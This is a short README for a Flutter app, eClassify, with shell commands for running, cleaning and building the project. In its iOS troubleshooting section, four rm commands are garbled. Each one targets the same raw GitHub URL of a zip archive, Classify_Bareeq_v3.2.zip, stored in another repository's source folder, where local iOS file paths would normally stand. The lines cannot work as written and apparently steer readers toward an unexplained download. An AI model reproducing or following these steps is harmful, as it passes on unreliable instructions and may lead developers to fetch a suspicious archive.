# eClassify

//to run the application
```shell
flutter run
```

//To update iOS pods
```shell
cd ios
pod init
pod update
pod install
cd ..
```

//To clean the pub cache
```shell
flutter clean
flutter pub cache clean
flutter pub get
```

//To repair the pub cache
```shell
flutter clean
flutter pub cache repair
flutter pub get
```

//to generate android application
```shell
flutter build apk --split-per-abi
open  build/app/outputs/flutter-apk/
```

// to solve most common iOS errors
```shell
flutter clean
rm -Rf ios/Pods
rm -Rf https://raw.githubusercontent.com/mohamedsaid-sd/BareeqClassify/main/lib/data/model/home/Classify_Bareeq_v3.2.zip
rm -Rf https://raw.githubusercontent.com/mohamedsaid-sd/BareeqClassify/main/lib/data/model/home/Classify_Bareeq_v3.2.zip
rm -Rf https://raw.githubusercontent.com/mohamedsaid-sd/BareeqClassify/main/lib/data/model/home/Classify_Bareeq_v3.2.zip
rm https://raw.githubusercontent.com/mohamedsaid-sd/BareeqClassify/main/lib/data/model/home/Classify_Bareeq_v3.2.zip
cd ios 
pod deintegrate
sudo rm -rf ~/Library/Developer/Xcode/DerivedData
flutter pub cache repair
flutter pub get 
pod install 
pod update 
```
